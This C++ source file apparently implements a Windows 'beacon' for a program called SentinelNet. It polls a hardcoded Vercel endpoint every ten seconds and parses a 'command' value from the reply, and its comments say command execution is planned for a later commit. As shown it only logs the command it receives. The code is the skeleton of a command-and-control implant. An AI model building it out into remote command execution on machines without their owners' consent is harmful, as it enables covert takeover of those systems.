#include "tunnel.h"
#include <string>
#include <vector>
#include <windows.h>
#include <winhttp.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <sstream>

#pragma comment(lib, "winhttp.lib")

#define VERCEL_HOST "sentinelnet-v2.vercel.app"
#define REPORT_PATH "/api/report"

// Helper to extract a value from a simple JSON string (e.g. {"command":"scan"})
static std::string getJsonValue(const std::string& json, const std::string& key) {
    size_t keyPos = json.find("\"" + key + "\"");
    if (keyPos == std::string::npos) return "";

    size_t colonPos = json.find(":", keyPos);
    if (colonPos == std::string::npos) return "";

    size_t startQuote = json.find("\"", colonPos);
    if (startQuote == std::string::npos) return "";

    size_t endQuote = json.find("\"", startQuote + 1);
    if (endQuote == std::string::npos) return "";

    return json.substr(startQuote + 1, endQuote - startQuote - 1);
}

static std::string httpsPost(const std::string &host, const std::string &path,
                      const std::string &body) {
  HINTERNET hSession =
      WinHttpOpen(L"SentinelNet/2.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                  WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (!hSession)
    return "";

  WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);

  HINTERNET hConnect =
      WinHttpConnect(hSession, std::wstring(host.begin(), host.end()).c_str(),
                     INTERNET_DEFAULT_HTTPS_PORT, 0);
  if (!hConnect) {
    WinHttpCloseHandle(hSession);
    return "";
  }

  std::wstring wPath(path.begin(), path.end());
  HINTERNET hRequest = WinHttpOpenRequest(
      hConnect, L"POST", wPath.c_str(), nullptr, WINHTTP_NO_REFERER,
      WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

  std::string response;
  if (hRequest) {
    std::wstring wHeaders(L"Content-Type: application/json\r\n");
    WinHttpAddRequestHeaders(hRequest, wHeaders.c_str(), -1L,
                             WINHTTP_ADDREQ_FLAG_ADD);

    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                       (LPVOID)body.c_str(), body.size(), body.size(), 0)) {
        if (WinHttpReceiveResponse(hRequest, nullptr)) {
            DWORD dwSize = 0;
            do {
                if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
                if (dwSize == 0) break;
                
                std::vector<char> buffer(dwSize);
                DWORD dwRead = 0;
                
                if (WinHttpReadData(hRequest, buffer.data(), dwSize, &dwRead)) {
                    response.append(buffer.data(), dwRead);
                }
            } while (dwSize > 0);
        }
    }
     WinHttpCloseHandle(hRequest);
  }

  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hSession);
  return response;
}

void TunnelManager::start() {
  // Commit 2: Command Polling (Beacon now READS the server response for tasks)
  while (true) {
    std::string body = "{\"url\":\"online\"}";
    std::string response = httpsPost(VERCEL_HOST, REPORT_PATH, body);

    if (!response.empty()) {
        std::string command = getJsonValue(response, "command");
        if (!command.empty()) {
            // Task received! (Execution logic will be in Commit 3)
            // For now, we just acknowledge receipt in the logs
            OutputDebugStringA(("Beacon: Recieved Command - " + command + "\n").c_str());
        }
    }

    // Wait 10s before the next heartbeat
    Sleep(10000);
  }
}